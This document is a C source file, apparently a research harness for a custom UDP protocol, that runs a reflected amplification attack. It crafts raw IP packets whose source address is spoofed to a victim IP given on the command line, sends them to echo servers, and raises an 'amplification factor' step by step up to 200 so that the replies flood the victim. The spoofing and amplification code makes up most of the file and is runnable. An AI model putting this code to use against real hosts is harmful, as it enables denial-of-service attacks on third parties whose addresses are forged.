#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sched.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include "../cudp.h"
#include "evalcase.h"

#define EVALLOG "../log/attack.udp"
#define EVALWAIT 5000000
#define EVALSLEEP 1000
#define EVALSPEED 100
#define EVALBATCH 10
#define EVALBUF  2000
#define EVALDATA 5

static int *sig;

struct cudp_packet
{
	struct ip	ih;
	struct udphdr	uh;
	struct cudphdr	ch;
	u8 data[EVALBUF];
};

struct udp_packet
{
	struct ip	ih;
	struct udphdr	uh;
	u8 data[EVALBUF];
};

/*
void logger(pid_t pid, int num)
{
	char fn[100];
	sprintf(fn, "/proc/%d/statm", pid);
	
	FILE *fs = fopen(fn, "r");
	if (!fs)
	{
		perror("fopen");
		return;
	}

	unsigned long size, resident, share, text, lib, data, dt;
	fscanf(fs, "%ld %ld %ld %ld %ld %ld %ld", &size, &resident,
		&share, &text, &lib, &data, &dt);

	printf("PID %d: Size = %ld, Conn = %d\n", pid, size, num);
	fclose(fs);

	fprintf(log, "%d %ld %ld %ld %ld %ld %ld %ld\n", num, size,
		resident, share, text, lib, data, dt);	
}
*/

int translate(const char* addr)
{
	int ip_value = 0, i, j;
	char part[100];

	i = 0;
	while(1)
	{
		for(j = 0; addr[i] != '.' && addr[i] != '\0'; i ++, j ++)
			part[j] = addr[i];
		part[j] = '\0';

		int v = atoi(part);
		ip_value = ((ip_value >> 8) & 0x00FFFFFF) | (v << 24);

		if(addr[i] == '\0')
			break;
		i ++;
	}

	return ip_value;
}

void sender_cudp(const char *victim_ip, struct sockaddr *server)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(0, &mask);
        if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
                perror("sched_setaffinity");

        int i, num;
	double ts = 0.0, tr;
        struct timeval start, now;

	int sockfd, ihlen = sizeof(struct ip), uhlen = sizeof(struct udphdr),
		chlen = sizeof(struct cudphdr);
	struct cudp_packet cp;
	memset(&cp, 0, sizeof(struct cudp_packet));

        cp.ih.ip_hl      =       5;
        cp.ih.ip_v       =       4;
        cp.ih.ip_tos     =       0;
        cp.ih.ip_len     =       htons (ihlen + uhlen + chlen + EVALDATA);
        cp.ih.ip_id      =       htons (0);
        cp.ih.ip_off     =       htons (0);
        cp.ih.ip_ttl     =       255;
        cp.ih.ip_p       =       IPPROTO_UDP;

        cp.ih.ip_src.s_addr = translate(victim_ip);
        cp.ih.ip_dst.s_addr = ((struct sockaddr_in*)server)->sin_addr.s_addr;

        cp.ih.ip_sum     =       0;

        cp.uh.source     =       htons(CLIPORTN);
        cp.uh.dest       =       htons(SERPORTN);
        cp.uh.len        =       htons(uhlen + chlen + EVALDATA);

        if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
        {
                perror("socket");
                return;
        }

        int on = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
        {
                perror("setsockopt");
                return;
        }

	while (!*sig)
		;
      
	printf("Sender CUDP Start:\n");
 	gettimeofday(&start, NULL);
	while (1)
	{
		cp.data[0] = *sig;
        	for (i = 0; i < EVALBATCH; i ++)
                        sendto(sockfd, &cp, ihlen + uhlen + chlen + EVALDATA,
                                0, server, sizeof(struct sockaddr));

		ts += EVALBATCH;

		gettimeofday(&now, NULL);
		tr = ((now.tv_sec - start.tv_sec) + (now.tv_usec - start.tv_usec)
				/ 1000000.0) * EVALSPEED;
		while (ts >= tr)
		{
			gettimeofday(&now, NULL);
			usleep(EVALSLEEP);
			tr = ((now.tv_sec - start.tv_sec) + (now.tv_usec - start.tv_usec)
				/ 1000000.0) * EVALSPEED;
		}
	}
}

void sender_udp(const char *victim_ip, struct sockaddr *server)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(1, &mask);
        if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
                perror("sched_setaffinity");

        int i, num;
	double ts = 0.0, tr;
        struct timeval start, now;
	u8 buf[EVALBUF];

	int sockfd, ihlen = sizeof(struct ip), uhlen = sizeof(struct udphdr);
        struct cudp_packet cp;
        memset(&cp, 0, sizeof(struct udp_packet));

        cp.ih.ip_hl      =       5;
        cp.ih.ip_v       =       4;
        cp.ih.ip_tos     =       0;
        cp.ih.ip_len     =       htons (ihlen + uhlen + EVALDATA);
        cp.ih.ip_id      =       htons (0);
        cp.ih.ip_off     =       htons (0);
        cp.ih.ip_ttl     =       255;
        cp.ih.ip_p       =       IPPROTO_UDP;

        cp.ih.ip_src.s_addr = translate(victim_ip);
        cp.ih.ip_dst.s_addr = ((struct sockaddr_in*)server)->sin_addr.s_addr;

        cp.ih.ip_sum     =       0;

        cp.uh.source     =       htons(CLIPORTN);
        cp.uh.dest       =       htons(UDPPORTN);
        cp.uh.len        =       htons(uhlen + EVALDATA);

        if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
        {
                perror("socket");
                return;
        }

        int on = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
        {
                perror("setsockopt");
                return;
        }

        while (!*sig)
                ;

        printf("Sender CUDP Start:\n");
        gettimeofday(&start, NULL);
        while (1)
        {
                cp.data[0] = *sig;
                for (i = 0; i < EVALBATCH; i ++)
                        sendto(sockfd, &cp, ihlen + uhlen + EVALDATA,
                                0, server, sizeof(struct sockaddr));
                ts += EVALBATCH;

                gettimeofday(&now, NULL);
                tr = ((now.tv_sec - start.tv_sec) + (now.tv_usec - start.tv_usec)
                                / 1000000.0) * EVALSPEED;
                while (ts >= tr)
                {
                        gettimeofday(&now, NULL);
                        usleep(EVALSLEEP);
                        tr = ((now.tv_sec - start.tv_sec) + (now.tv_usec - start.tv_usec)
                                / 1000000.0) * EVALSPEED;
                }
        }
}

void recver_cudp(int sockfd, struct sockaddr *client)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(2, &mask);
	if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
		perror("sched_setaffinity");

	int i, num, len = sizeof(struct sockaddr);
	struct cudp_buffer *cbuf = cudp_buffer_init(EVALBUF);

	while (!*sig)
		;

	printf("Recver CUDP Start\n");
	while (1)
	{
printf("Debug: recv cudp begin.\n");
		num = cudp_recvfrom(sockfd, cbuf, 0, client, &len);
printf("Debug: recv cudp end. src=%0x\tlen=%d\n", ((struct sockaddr_in*)client)->sin_addr.s_addr, num * CUDP_MESSAGE(cbuf)[0]);
		cbuf->msglen = num * CUDP_MESSAGE(cbuf)[0];
		cudp_sendto(sockfd, cbuf, 0, client, len);
	}
	cudp_buffer_destroy(cbuf);
}

void recver_udp(int sockfd, struct sockaddr *client)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(4, &mask);
	if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
		perror("sched_setaffinity");

	int i, num = 0, len = sizeof(struct sockaddr);
	u8 buf[EVALBUF];

	while (!*sig)
		;

	printf("Recver UDP Start");
	while (1)
	{
		num = recvfrom(sockfd, buf, EVALBUF, 0, client, &len);
		sendto(sockfd, buf, num * buf[0], 0, client, len);
	}
}

int init_addrinfo(struct addrinfo **ais, const char *host, const char *port)
{
	int res;
	struct addrinfo hints;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;

	if ((res = getaddrinfo(host, port, &hints, ais)) != 0)
	{
		perror("getaddrinfo");
		return res;
	}

	return 0;
}

int init_socket(struct addrinfo *ais, struct addrinfo **ai)
{
	int sockfd;
	
	for ( *ai = ais; *ai != NULL; *ai = (*ai)->ai_next)
	{
		if ((sockfd = socket((*ai)->ai_family, (*ai)->ai_socktype,
			(*ai)->ai_protocol)) == -1)
		{
			perror("socket");
			continue;
		}

		break;
	}

	return sockfd;
}

int init_bind(int sockfd, struct addrinfo *ai)
{
	int res;

	if ((res = bind(sockfd, ai->ai_addr, ai->ai_addrlen)) == -1)
		perror("bind");

	return res;
}

int main(int argc, char *argv[])
{
	if (argc < 2)
	{
		printf("Missing Arguments!\n");
		printf("Usage: CMD victim_ip\n");
		return 1;
	}

	int udprecvfd, cudprecvfd, attackfd;
	struct addrinfo *usinfo, *csinfo, *vinfo, *u, *c, *v;

	pid_t us_pid = 0, cs_pid, a_pid = 0;
	int i, res;

	sig = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
			MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*sig = 0;

printf("Debug: ip = %s\n", argv[1]);
	init_addrinfo(&csinfo, NULL, SERVERPORT);
	init_addrinfo(&usinfo, NULL, SERUDPPORT);
	init_addrinfo(&vinfo, argv[1], CLIENTPORT);

	cudprecvfd = init_socket(csinfo, &c);
	udprecvfd = init_socket(usinfo, &u);
	attackfd = init_socket(vinfo, &v);

	init_bind(cudprecvfd, c);
	init_bind(udprecvfd, u);
	// init_bind(attackfd, v);
	
	for (i = 0; i < 3; i ++)
	{
		res = fork();
		if (res > 0)
		{
			switch (i)
			{
			case 0:
				cs_pid = res;
				printf("CUDP Server PID:\t%d\n", res);
				break;
			case 1:
				us_pid = res;
				printf("UDP Server PID:\t%d\n", res);
				break;
			case 2:
				a_pid  = res;
				printf("Attack PID:\t%d\n", res);
				break;
			default:
				break;
			}
		}
		else if (res == 0)
		{
			switch (i)
			{
			case 0:
				recver_cudp(cudprecvfd, v->ai_addr);
				break;
			case 1:
				recver_udp(udprecvfd, v->ai_addr);
				break;
			case 2:
				// using cudp to attack
				sender_cudp(argv[1], c->ai_addr);
				break;
			default:
				break;
			}
		}
		else
			printf("Error: fork() failed.\n");
	}

	if (res > 0)
	{
		for (i = 1; i <= 20; i ++)
		{
			*sig = i * 10;
			printf("Amplification Factor: %d\n", *sig);
			usleep(EVALWAIT);
		}

		if (cs_pid)
			wait(&cs_pid);
		if (us_pid)
			wait(&us_pid);
		if (a_pid)
			wait(&a_pid);

		freeaddrinfo(vinfo);
		freeaddrinfo(usinfo);
		freeaddrinfo(csinfo);
	}
}
